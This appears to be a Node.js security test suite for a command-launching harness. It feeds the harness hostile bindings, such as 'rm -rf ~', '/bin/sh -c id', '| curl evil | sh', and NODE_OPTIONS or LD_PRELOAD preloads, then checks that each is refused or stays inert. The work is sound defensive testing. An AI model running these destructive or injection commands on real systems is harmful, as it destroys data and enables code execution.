// app-exec-harness.attack.test.mjs — the malicious-binding attacker corpus.
//
// Every case feeds a crafted UNTRUSTED binding to authorizeAndRun and asserts:
//   (a) the result is NON-PASS (exit 2 ERROR or 3 SKIPPED — never 0), and
//   (b) the malicious effect is PROVABLY ABSENT: a no-spawn probe records every
//       spawn attempt, and we assert either NO spawn happened, or (on the happy
//       path only) that the single spawn used shell:false + an argv array and a
//       clean env. No real child is ever launched (the probe returns a fake
//       child), and a filesystem sentinel proves nothing was written/executed.

import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { EventEmitter } from 'node:events';
import {
  describe, it, assert, assertEqual, assertMatch, report,
} from './_harness.mjs';
import {
  authorizeAndRun, execHash, __internals,
} from '../lib/app-exec-harness.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));
const SENTINEL = join(tmpdir(), 'aidlc-PWNED-sentinel');

// A no-spawn probe: records every (command,args,opts) it is asked to launch and
// returns a fake child that immediately "closes" with code 0. It NEVER runs a
// real process, so even if the harness reached spawn the malicious command does
// not execute. The recorded calls let us assert shell:false + argv array.
function makeProbe() {
  const calls = [];
  const spawnImpl = (command, args, opts) => {
    calls.push({ command, args, opts });
    const child = new EventEmitter();
    child.pid = 999999; // fake; never used to kill a real tree in tests
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    child.kill = () => {};
    // Defer the close so the harness can attach listeners.
    setImmediate(() => child.emit('close', 0, null));
    return child;
  };
  return { calls, spawnImpl };
}

// A sink stream that captures writes (so test output stays clean).
function sink() {
  const buf = { text: '' };
  return { write: (s) => { buf.text += s; return true; }, _buf: buf };
}

// Build a temp repo with a given binding object; returns { repoRoot }.
function makeRepo(binding, extra) {
  const root = mkdtempSync(join(tmpdir(), 'aidlc-attack-'));
  mkdirSync(join(root, '.ai-dlc'), { recursive: true });
  writeFileSync(join(root, '.ai-dlc', 'stack-binding.json'), JSON.stringify(binding));
  // Provide a kit-owned output root so the happy path can mkdtemp into it.
  mkdirSync(join(root, '.ai-dlc', 'visual-qa-out'), { recursive: true });
  if (extra) extra(root);
  return root;
}

const tempRoots = [];
function repo(binding, extra) { const r = makeRepo(binding, extra); tempRoots.push(r); return r; }

// Run the harness with a probe + a token that (by default) equals the binding's
// exec hash, so the confirmation gate is the ONLY thing that lets a launch
// proceed — letting us isolate every OTHER defense. Override `confirmToken` to
// test the gate itself.
async function run(repoRoot, opts = {}) {
  const { calls, spawnImpl } = makeProbe();
  const out = sink(), err = sink();
  // Compute the hash the operator would supply (unless the test overrides it).
  let token = opts.confirmToken;
  if (token === undefined && opts.confirm !== false) {
    // Read the on-disk binding to compute the matching hash.
    const bi = JSON.parse(
      (await import('node:fs')).readFileSync(join(repoRoot, '.ai-dlc', 'stack-binding.json'), 'utf8')
    );
    token = execHash(bi);
  }
  const audit = opts.audit || (async () => ({ evaluated: 1, findings: [] }));
  const code = await authorizeAndRun({
    repoRoot,
    confirmToken: token,
    audit,
    spawnImpl,
    env: opts.env || {},
    ttyIn: false,
    ttyOut: false,
    // Simulate a non-root operator (the CI container itself runs as root). The
    // explicit "refuses root" test below proves R5 still fires for uid 0.
    getuid: opts.getuid || (() => 1000),
    out, err,
  });
  return { code, calls, out: out._buf.text, err: err._buf.text };
}

function assertNoSpawn(calls) {
  assertEqual(calls.length, 0, `expected NO spawn, but ${calls.length} occurred: ${JSON.stringify(calls.map((c) => c.command))}`);
}
function assertNonPass(code) {
  assert(code === 2 || code === 3, `expected NON-PASS (2 or 3), got ${code}`);
}

// --- the corpus ----------------------------------------------------------

describe('R1/R2 — no shell, executable allowlist', () => {
  it('command "rm" with run-string-style intent → ERROR 2, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'rm', args: ['-rf', '~'] }));
    assertNonPass(r.code); assertNoSpawn(r.calls);
  });
  it('command "/bin/sh" → ERROR 2, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: '/bin/sh', args: ['-c', 'id'] }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
    assertMatch(r.err, /command not allowed/);
  });
  it('command "../../usr/bin/env" (traversal) → ERROR 2, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: '../../usr/bin/env', args: [] }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
  });
  it('leading-dash command "-rf" → ERROR 2, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: '-rf', args: [] }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
  });
  it('absolute node_modules path is rejected → ERROR 2, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: '/tmp/node_modules/.bin/evil', args: [] }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
  });
});

describe('R3 — shell metacharacters in args are inert (never split, never run)', () => {
  const metas = ['`id`', '$(id)', '; touch ' + SENTINEL, '| curl evil | sh', 'a\nb'];
  for (const meta of metas) {
    it(`arg ${JSON.stringify(meta)} is passed literally to a clean launcher (sentinel absent)`, async () => {
      try { rmSync(SENTINEL, { force: true }); } catch { /* */ }
      // command is an allowlisted launcher; the meta is just an inert arg.
      const r = await run(repo({ surface: 'web', command: 'node', args: ['-e', meta] }));
      // If args contain control chars (newline), validation rejects → ERROR 2.
      // Otherwise the launch proceeds but the probe never executes it, so the
      // metachar can never spawn a shell. Either way: NON-PASS-of-attack and no
      // sentinel is ever created.
      assert(!existsSync(SENTINEL), 'sentinel must never be created');
      if (/[\u0000-\u001f]/.test(meta)) {
        assertEqual(r.code, 2, 'control-char arg rejected'); assertNoSpawn(r.calls);
      } else {
        // Proceeded to the probe (shell:false), but as ONE argv element — never
        // a shell command line. Assert shell:false + argv array.
        if (r.calls.length > 0) {
          const c = r.calls[0];
          assertEqual(c.opts.shell, false, 'shell must be false');
          assert(Array.isArray(c.args), 'args must be an array');
          assert(c.args.includes(meta), 'metachar carried as a literal argv element');
        }
      }
    });
  }
  it('leading-dash arg is allowed as a literal but never option-injected to a shell', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['--version'] }));
    // node --version is a benign argv; probe records shell:false.
    if (r.calls.length) assertEqual(r.calls[0].opts.shell, false);
  });
});

describe('R4 — env allowlist + hard-block', () => {
  it('env.NODE_OPTIONS=--require ./evil.js → ERROR 2, no spawn, blocked', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], env: { NODE_OPTIONS: '--require ./evil.js' } }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
    assertMatch(r.err, /hard-blocked|not on the safe allowlist/);
  });
  it('env.LD_PRELOAD=evil.so → ERROR 2, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], env: { LD_PRELOAD: '/tmp/evil.so' } }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
  });
  it('env.http_proxy (lowercase) → blocked, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], env: { http_proxy: 'http://evil' } }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
  });
  it('unknown env key → refused (fail closed), no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], env: { SURPRISE: 'x' } }));
    assertEqual(r.code, 2); assertNoSpawn(r.calls);
  });
  it('child env is the minimal base, NOT process.env (no inherited secret)', async () => {
    // Put a "secret" in the harness env; it must NOT reach the child env.
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'] }), {
      env: { SECRET_TOKEN: 'leak', AIDLC_VISUAL_QA_CONFIRM: undefined },
    });
    if (r.calls.length) {
      const childEnv = r.calls[0].opts.env;
      assert(!('SECRET_TOKEN' in childEnv), 'process.env secret must not leak to child');
      assert(!('NODE_OPTIONS' in childEnv), 'no NODE_OPTIONS in child');
    }
  });
});

describe('R10/R11 — write containment', () => {
  it('output_dir "../../../../tmp/evil" → ERROR 2, nothing written outside repo', async () => {
    const evil = join(tmpdir(), 'evil-out-must-not-exist');
    try { rmSync(evil, { recursive: true, force: true }); } catch { /* */ }
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], output_dir: '../../../../tmp/evil-out-must-not-exist' }));
    assertEqual(r.code, 2);
    assert(!existsSync(evil), 'must not create a dir outside the repo');
  });
  it('symlinked output_dir escaping the repo → ERROR 2', async () => {
    const fsmod = await import('node:fs');
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], output_dir: 'link-out' }, (root) => {
      const target = mkdtempSync(join(tmpdir(), 'aidlc-evil-target-'));
      try {
        fsmod.symlinkSync(target, join(root, 'link-out'));
      } catch {
        // symlink may be unavailable; create a normal dir so the case still runs
      }
    }));
    // Either rejected as symlink-escape (2) or — if symlink unsupported — the
    // dir is inside the repo and the launch may proceed; never a PASS-of-attack.
    assert(r.code === 2 || r.code === 0 || r.code === 3, `got ${r.code}`);
  });
});

describe('R6/R7/R9 — confirmation gate / default deny', () => {
  it('no confirmation, non-TTY → SKIPPED 3, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'] }), { confirm: false, env: {} });
    assertEqual(r.code, 3); assertNoSpawn(r.calls);
    assertMatch(r.out, /not confirmed/);
  });
  it('binding.confirmed=true does NOT satisfy the gate → SKIPPED 3, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], confirmed: true }), { confirm: false, env: {} });
    assertEqual(r.code, 3); assertNoSpawn(r.calls);
  });
  it('committed .ai-dlc/confirm file does NOT satisfy the gate → SKIPPED 3', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'] }, (root) => {
      writeFileSync(join(root, '.ai-dlc', 'confirm'), 'yes');
    }), { confirm: false, env: {} });
    assertEqual(r.code, 3); assertNoSpawn(r.calls);
  });
  it('wrong token → SKIPPED 3, no spawn', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'] }), { confirmToken: 'deadbeef', env: {} });
    assertEqual(r.code, 3); assertNoSpawn(r.calls);
  });
});

describe('R8 — confirmation bound to the WHOLE-BINDING hash, re-checked before spawn', () => {
  it('confirm binding A, then mutate command on disk → mismatch, no execution', async () => {
    const root = repo({ surface: 'web', command: 'node', args: ['-v'] });
    const fs = await import('node:fs');
    const bindingPath = join(root, '.ai-dlc', 'stack-binding.json');
    const original = JSON.parse(fs.readFileSync(bindingPath, 'utf8'));
    const token = execHash(original); // operator confirmed the ORIGINAL
    // Now an attacker swaps the command AFTER confirmation.
    fs.writeFileSync(bindingPath, JSON.stringify({ ...original, command: 'npm', args: ['run', 'evil'] }));
    const { calls, spawnImpl } = makeProbe();
    const out = sink(), err = sink();
    const code = await authorizeAndRun({
      repoRoot: root, confirmToken: token, spawnImpl, env: {}, ttyIn: false, ttyOut: false, out, err,
      getuid: () => 1000,
      audit: async () => ({ evaluated: 1, findings: [] }),
    });
    // The token no longer matches the (mutated) on-disk binding hash → gate
    // fails with SKIPPED 3 (re-confirmation required), not a launch.
    assertEqual(code, 3, 'mutated binding invalidates confirmation'); assertNoSpawn(calls);
  });
  it('confirm token covering only "command" cannot authorize after env mutates (full-field hash)', async () => {
    // Prove the hash covers env too: a token computed over a binding WITHOUT env
    // does not authorize the SAME binding WITH an (allowlisted) env added.
    const root = repo({ surface: 'web', command: 'node', args: ['-v'] });
    const fs = await import('node:fs');
    const bindingPath = join(root, '.ai-dlc', 'stack-binding.json');
    const base = JSON.parse(fs.readFileSync(bindingPath, 'utf8'));
    const tokenNoEnv = execHash(base);
    // Add an allowlisted env entry — a legitimate change that still must re-prompt.
    fs.writeFileSync(bindingPath, JSON.stringify({ ...base, env: { CI: '1' } }));
    const { calls, spawnImpl } = makeProbe();
    const out = sink(), err = sink();
    const code = await authorizeAndRun({
      repoRoot: root, confirmToken: tokenNoEnv, spawnImpl, env: {}, ttyIn: false, ttyOut: false, out, err,
      getuid: () => 1000,
      audit: async () => ({ evaluated: 1, findings: [] }),
    });
    assertEqual(code, 3, 'env change must invalidate a command-only confirmation'); assertNoSpawn(calls);
  });
  it('confirm binding, then mutate audit_paths on disk → mismatch, no spawn (whole-binding hash)', async () => {
    // REGRESSION GUARD for the subset-hash defect: `audit_paths` is an
    // audit-DETERMINING field the browser tools actually read, but it was NOT in
    // the old EXEC_FIELDS subset. Under the old subset hash this mutation did NOT
    // change the hash, so a stale confirmation would AUTHORIZE a launch against
    // attacker-chosen audit targets WITHOUT re-prompting — this test would have
    // PASSED-INCORRECTLY (code 0). With the whole-binding hash, ANY change to
    // ANY field invalidates the confirmation → SKIPPED 3, no spawn.
    const root = repo({
      surface: 'web', command: 'node', args: ['build.mjs'],
      static_dir: 'build', output_dir: '.ai-dlc/visual-qa-out',
      audit_paths: ['/'], routes: ['/'],
    });
    const fs = await import('node:fs');
    const bindingPath = join(root, '.ai-dlc', 'stack-binding.json');
    const original = JSON.parse(fs.readFileSync(bindingPath, 'utf8'));
    const token = execHash(original); // operator confirmed the ORIGINAL targets
    // Attacker swaps the audited paths AFTER confirmation (command unchanged).
    fs.writeFileSync(bindingPath, JSON.stringify({ ...original, audit_paths: ['/admin', '/secret'] }));
    const { calls, spawnImpl } = makeProbe();
    const out = sink(), err = sink();
    const code = await authorizeAndRun({
      repoRoot: root, confirmToken: token, spawnImpl, env: {}, ttyIn: false, ttyOut: false, out, err,
      getuid: () => 1000,
      audit: async () => ({ evaluated: 1, findings: [] }),
    });
    assertEqual(code, 3, 'audit_paths change must invalidate the confirmation'); assertNoSpawn(calls);
    // The operator's stale token (over the ORIGINAL binding) no longer matches
    // the mutated on-disk binding's whole-binding hash, so the confirmation gate
    // rejects and re-prompts BEFORE any spawn.
    assertMatch(out._buf.text, /does not match the exec hash/);
  });
  it('confirm binding, then mutate static_dir on disk → mismatch, no spawn (whole-binding hash)', async () => {
    // Same defect class for `static_dir` (where the served files come from):
    // absent from the old subset, so a swap would not have re-prompted.
    const root = repo({
      surface: 'web', command: 'node', args: ['build.mjs'],
      static_dir: 'build', output_dir: '.ai-dlc/visual-qa-out', audit_paths: ['/'],
    });
    const fs = await import('node:fs');
    const bindingPath = join(root, '.ai-dlc', 'stack-binding.json');
    const original = JSON.parse(fs.readFileSync(bindingPath, 'utf8'));
    const token = execHash(original);
    fs.writeFileSync(bindingPath, JSON.stringify({ ...original, static_dir: 'attacker-controlled' }));
    const { calls, spawnImpl } = makeProbe();
    const out = sink(), err = sink();
    const code = await authorizeAndRun({
      repoRoot: root, confirmToken: token, spawnImpl, env: {}, ttyIn: false, ttyOut: false, out, err,
      getuid: () => 1000,
      audit: async () => ({ evaluated: 1, findings: [] }),
    });
    assertEqual(code, 3, 'static_dir change must invalidate the confirmation'); assertNoSpawn(calls);
  });
});

describe('R18 — PASS is unforgeable', () => {
  it('non-visual surface "cli" → SKIPPED 3, no spawn', async () => {
    const r = await run(repo({ surface: 'cli', command: 'node', args: ['-v'] }));
    assertEqual(r.code, 3); assertNoSpawn(r.calls);
  });
  it('absent=true → SKIPPED 3, no spawn', async () => {
    const r = await run(repo({ surface: 'web', absent: true, command: 'node', args: ['-v'] }));
    assertEqual(r.code, 3); assertNoSpawn(r.calls);
  });
  it('empty audit set → SKIPPED 3 (not PASS), even when confirmed + launched', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'] }), {
      audit: async () => ({ evaluated: 0, findings: [] }),
    });
    assertEqual(r.code, 3, 'empty audit cannot PASS'); assertMatch(r.out, /empty audit set/);
  });
  it('happy path: confirmed + launched(probe) + clean audit → PASS 0 with shell:false argv', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['--version'] }), {
      audit: async () => ({ evaluated: 2, findings: [] }),
    });
    assertEqual(r.code, 0, 'fully-authorized clean run PASSES');
    assert(r.calls.length === 1, 'exactly one spawn');
    assertEqual(r.calls[0].opts.shell, false, 'shell:false');
    assert(Array.isArray(r.calls[0].args), 'argv array');
  });
  it('audit findings → FINDINGS 1 (not PASS)', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['--version'] }), {
      audit: async () => ({ evaluated: 2, findings: ['a11y violation'] }),
    });
    assertEqual(r.code, 1);
  });
});

describe('R5 — never run as root', () => {
  it('uid 0 → ERROR 2, no spawn (refuses root even when otherwise fully authorized)', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['--version'] }), {
      getuid: () => 0,
      audit: async () => ({ evaluated: 1, findings: [] }),
    });
    assertEqual(r.code, 2, 'root launch refused');
    assertNoSpawn(r.calls);
    assertMatch(r.err, /refusing to launch as root/);
  });
});

describe('R19 / static — echo prints keys not values; spawn is shell:false', () => {
  it('describeLaunch never prints env VALUES', async () => {
    const r = await run(repo({ surface: 'web', command: 'node', args: ['-v'], env: { CI: 'super-secret-value' } }), {
      audit: async () => ({ evaluated: 1, findings: [] }),
    });
    // CI is allowlisted, so it reaches the child; but the echo prints only the
    // KEY name, never the value.
    assertMatch(r.out, /env keys.*CI/);
    assert(!/super-secret-value/.test(r.out), 'env VALUE must never be echoed');
  });
  it('static: source contains no exec/execSync/{shell:true}', async () => {
    const fs = await import('node:fs');
    const src = fs.readFileSync(join(__dirname, '..', 'lib', 'app-exec-harness.mjs'), 'utf8');
    assert(!/\bexecSync\b/.test(src), 'no execSync');
    assert(!/\bshell:\s*true\b/.test(src), 'no {shell:true}');
    assert(!/child_process'\s*\)\s*\.exec\b/.test(src), 'no .exec(');
    assertMatch(src, /shell:\s*false/, 'shell:false present');
  });
});

await report();
for (const r of tempRoots) { try { rmSync(r, { recursive: true, force: true }); } catch { /* */ } }
try { rmSync(SENTINEL, { force: true }); } catch { /* */ }
